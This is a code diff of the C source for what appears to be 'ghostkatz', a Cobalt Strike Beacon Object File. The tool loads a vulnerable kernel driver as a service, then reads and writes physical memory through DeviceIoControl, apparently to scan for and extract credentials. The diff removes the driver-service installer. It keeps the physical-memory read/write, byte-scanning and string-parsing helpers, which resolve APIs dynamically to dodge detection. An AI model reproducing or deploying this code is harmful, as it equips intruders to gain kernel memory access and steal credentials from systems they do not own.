@@ -1,154 +1,8 @@
 #include <windows.h>
 
 #include "beacon.h"
-#include "provider.h"
 #include "ghostkatz.h"
 #include "defs.h"
-
-// DFR
-typedef BOOL(NTAPI* fnDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
-typedef SC_HANDLE(NTAPI* fnOpenSCManagerA)(LPCSTR lpMachineName,LPCSTR lpDatabaseName,DWORD dwDesiredAccess);
-typedef SC_HANDLE(NTAPI* fnOpenServiceA)(SC_HANDLE hSCManager,LPCSTR lpServiceName,DWORD dwDesiredAccess);
-typedef SC_HANDLE(NTAPI* fnCreateServiceA)(SC_HANDLE hSCManager,LPCSTR lpServiceName,LPCSTR lpDisplayName,DWORD dwDesiredAccess,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCSTR lpBinaryPathName,LPCSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCSTR lpDependencies,LPCSTR lpServiceStartName,LPCSTR lpPassword);
-typedef BOOL(NTAPI* fnStartServiceA)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCSTR* lpServiceArgVectors);
-typedef BOOL(NTAPI* fnQueryServiceStatus)(SC_HANDLE hService, LPSERVICE_STATUS lpServiceStatus);
-typedef BOOL(NTAPI* fnControlService)(SC_HANDLE hService,DWORD dwControl,LPSERVICE_STATUS lpServiceStatus);
-typedef BOOL(NTAPI* fnDeleteService)(SC_HANDLE hService);
-typedef BOOL(NTAPI* fnCloseServiceHandle)(SC_HANDLE hSCObject);
-
-BOOL isServiceInstalled(int provId)
-{
-    fnOpenSCManagerA pOpenSCManagerA = (fnOpenSCManagerA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenSCManagerA");
-    fnOpenServiceA pOpenServiceA = (fnOpenServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "OpenServiceA");
-    fnCreateServiceA pCreateServiceA = (fnCreateServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CreateServiceA");
-    fnQueryServiceStatus pQueryServiceStatus = (fnQueryServiceStatus)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "QueryServiceStatus");
-    fnStartServiceA pStartServiceA = (fnStartServiceA)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "StartServiceA");
-    fnCloseServiceHandle pCloseServiceHandle = (fnCloseServiceHandle)GetProcAddress(GetModuleHandleA("Advapi32.dll"), "CloseServiceHandle");
-
-    PROVIDER_INFO* prov_info = GetProviderInfo(provId);
-
-    const char* drvBasePath = "C:\\Windows\\System32\\drivers\\";
-    const char* drvName = prov_info->service_name;
-    const char* drvFileName = prov_info->driver_filename;
-    char drvFullPath[MAX_PATH];
-    sprintf(drvFullPath, "%s%s", drvBasePath, drvFileName);
-
-    //BeaconPrintf(CALLBACK_OUTPUT, "[DEBUG] Driver path: %s", drvFullPath);
-
-    SC_HANDLE hSCManager = pOpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (hSCManager == NULL)
-    {
-        BeaconFormatPrintf(&outputbuffer, "Failed to open SCM!\n");
-        return FALSE;
-    }
-
-    SC_HANDLE hServiceObject = pOpenServiceA(hSCManager, prov_info->service_name, SERVICE_ALL_ACCESS);
-    if (hServiceObject == NULL)
-    {
-        if (GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST)
-        {
-            hServiceObject = pCreateServiceA(
-                hSCManager,
-                prov_info->service_name,
-                prov_info->service_name,
-                SERVICE_ALL_ACCESS,
-                SERVICE_KERNEL_DRIVER,
-                SERVICE_DEMAND_START,
-                SERVICE_ERROR_IGNORE,
-                drvFullPath,
-                NULL, NULL, NULL, NULL, ""
-            );
-
-            if (hServiceObject == NULL)
-            {
-                BeaconFormatPrintf(&outputbuffer, "Failed to create driver service! 0x%llx\n", GetLastError());
-                pCloseServiceHandle(hSCManager);
-                return FALSE;
-            }
-            else
-            {
-                BeaconFormatPrintf(&outputbuffer, "Created driver service!\n");
-
-                if (!pStartServiceA(hServiceObject, 0, NULL))
-                {
-                    DWORD e = GetLastError();
-                    if (e == ERROR_SERVICE_ALREADY_RUNNING)
-                    {
-                        BeaconFormatPrintf(&outputbuffer, "[+] Service already running.\n");
-                        pCloseServiceHandle(hServiceObject);
-                        pCloseServiceHandle(hSCManager);
-                        return TRUE;
-                    }
-                    else
-                    {
-                        BeaconFormatPrintf(&outputbuffer, "[!] Failed to start service : %lu\n", e);
-                        pCloseServiceHandle(hServiceObject);
-                        pCloseServiceHandle(hSCManager);
-                        return FALSE;
-                    }
-                }
-                else
-                {
-                    BeaconFormatPrintf(&outputbuffer, "[+] Started driver service.\n");
-                    pCloseServiceHandle(hServiceObject);
-                    pCloseServiceHandle(hSCManager);
-                    return TRUE;
-                }
-            }
-        }
-        else
-        {
-            BeaconFormatPrintf(&outputbuffer, "Failed to open service object!\n");
-            pCloseServiceHandle(hSCManager);
-            return FALSE;
-        }
-    }
-    else
-    {
-        SERVICE_STATUS ss = { 0 };
-
-        BeaconFormatPrintf(&outputbuffer, "[+] Found pre-existing driver service.\n");
-
-        if (!pQueryServiceStatus(hServiceObject, &ss))
-        {
-            BeaconFormatPrintf(&outputbuffer, "[!] QueryServiceStatus failed: %lu\n", GetLastError());
-            pCloseServiceHandle(hServiceObject);
-            pCloseServiceHandle(hSCManager);
-            return FALSE;
-        }
-
-        if (ss.dwCurrentState == SERVICE_RUNNING)
-        {
-            BeaconFormatPrintf(&outputbuffer, "[+] Service already running.\n");
-            pCloseServiceHandle(hServiceObject);
-            pCloseServiceHandle(hSCManager);
-            return TRUE;
-        }
-
-        // Not running -> attempt start
-        if (!pStartServiceA(hServiceObject, 0, NULL))
-        {
-            DWORD e = GetLastError();
-            if (e == ERROR_SERVICE_ALREADY_RUNNING)
-            {
-                BeaconFormatPrintf(&outputbuffer, "[+] Service already running.\n");
-                pCloseServiceHandle(hServiceObject);
-                pCloseServiceHandle(hSCManager);
-                return TRUE;
-            }
-
-            BeaconFormatPrintf(&outputbuffer, "[!] Failed to start existing service : %lu\n", e);
-            pCloseServiceHandle(hServiceObject);
-            pCloseServiceHandle(hSCManager);
-            return FALSE;
-        }
-
-        BeaconFormatPrintf(&outputbuffer, "[+] Started existing driver service.\n");
-        pCloseServiceHandle(hServiceObject);
-        pCloseServiceHandle(hSCManager);
-        return TRUE;
-    }
-}
 
 
 char* GetWinBuildNumber()
@@ -191,6 +45,7 @@ char* GetWinVersion()
 
 BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
 {
+    typedef BOOL(NTAPI* fnDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
     fnDeviceIoControl pDeviceIoControl = (fnDeviceIoControl)GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeviceIoControl");
 
     typedef struct _PHYSICAL_WRITE_REQUEST {
@@ -226,6 +81,7 @@ BOOL WriteByte(HANDLE hFile, ULONG_PTR PhysicalAddress, BYTE WriteValue)
 
 BOOL ReadByte(HANDLE hFile, ULONG_PTR PhysicalAddress, PBYTE ReadValue)
 {
+    typedef BOOL(NTAPI* fnDeviceIoControl)(HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
     fnDeviceIoControl pDeviceIoControl = (fnDeviceIoControl)GetProcAddress(GetModuleHandleA("kernel32.dll"), "DeviceIoControl");
 
     typedef struct _PHYSICAL_READ_REQUEST {
@@ -282,8 +138,6 @@ unsigned char* ReadMultipleBytes(HANDLE hFile, int NumberOfBytesToRead, DWORD64 
 
 DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBytesToRead, DWORD64 PhysicalAddress)
 {
-    //DEBUG_PRINT("Performing a byte scan starting at physical address 0x%llx\n", PhysicalAddress);
-
     int ArraySize = sizeof(TargetByteArray) - 1;
     int arrayCounter = 0;
 
@@ -295,8 +149,6 @@ DWORD64 ByteScan(HANDLE hFile, unsigned char* TargetByteArray, int MaxNumberOfBy
     {
         ReadByte(hFile, i, &readByteValue);
         InternalByteArray[arrayCounter] = readByteValue;
-
-        //printf("Target Byte: 0x%x\n", TargetByteArray[arrayCounter]);
 
         if (arrayCounter == ArraySize - 1)
         {
@@ -349,7 +201,8 @@ wchar_t* ReadUnicodeStringFromPhysical(HANDLE hFile, DWORD64 UnicodeStringStruct
     } UNICODE_STRING, *PUNICODE_STRING;
     */
 
-    // It is a UNICODE_STRING struct so we have to get the string length at the first byte, and the pointer to the string will start at 0x8
+    // It is a UNICODE_STRING struct so we have to get the string length at the first byte,
+    // and the pointer to the string will start at 0x8
 
     // Get length
     BYTE UnicodeStringLength = 0;
@@ -383,7 +236,6 @@ BOOL PrintHex(unsigned char* ByteArray, int ByteArraySize)
 {    
     for (int i = 0; i < ByteArraySize; i++)
     {
-        // printf("%02x", (unsigned char*)ByteArray[i]);
         BeaconFormatPrintf(&outputbuffer, "%02x", (unsigned int)ByteArray[i]);
     }
     BeaconFormatPrintf(&outputbuffer, "\n");
